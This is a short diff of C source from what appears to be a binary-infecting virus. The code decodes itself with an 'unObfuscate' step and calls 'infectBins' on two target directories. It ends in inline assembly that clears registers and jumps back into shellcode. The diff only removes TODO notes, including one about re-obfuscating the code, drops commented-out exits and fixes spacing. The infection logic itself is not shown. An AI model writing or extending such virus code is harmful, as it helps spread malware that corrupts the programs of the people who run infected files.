@@ -1,5 +1,3 @@
-// TODO Compile every libc functions in a static lib
-// TODO Obfuscate code again when finished
 #include "shellcode.h"
 
 static void  start(void) {}
@@ -19,11 +17,9 @@ int   entry_point(void *magic) {
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
-      /* exit(1); */
   infectBins(infectDir);
   infectBins(infectDir2);
   return (stop(0, magic));
-  /* exit(0); */
 }
 
 static int   stop(int status, void *magic) {
@@ -39,7 +35,7 @@ static int   stop(int status, void *magic) {
       "mov $0, %rdi\n\t"
       "mov $0, %rax\n\t"
       "mov $0, %rbp\n\t"
-      "mov $0,%r8\n\t"
+      "mov $0, %r8\n\t"
       "mov $0, %r10\n\t"
       "mov $0, %r11\n\t"
       "jmp endSC");
